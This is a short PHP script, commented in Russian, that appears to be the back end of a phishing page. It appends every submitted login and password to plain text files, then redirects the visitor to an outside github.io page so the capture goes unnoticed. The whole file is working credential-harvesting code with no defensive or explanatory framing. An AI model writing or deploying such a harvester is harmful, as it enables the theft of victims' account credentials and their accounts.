<?php
$fp0 = fopen("login.txt", "a"); // Открываем файл в режиме записи 
$mytext0 = $_POST['login']; // Исходная строка
$log = fwrite($fp0, $mytext0.' ;'); // Запись в файл
fclose($fp0); //Закрытие файла
$fp1 = fopen("password.txt", "a"); // Открываем файл в режиме записи 
$mytext = $_POST['password']; // Исходная строка
$pass = fwrite($fp1, $mytext.' ;'); // Запись в файл
if(isset ($_POST['do_login']))
{
    if ($log && $pass) header('Location: https://mirios.github.io/k_d_k/');
}
fclose($fp1); //Закрытие файла
?>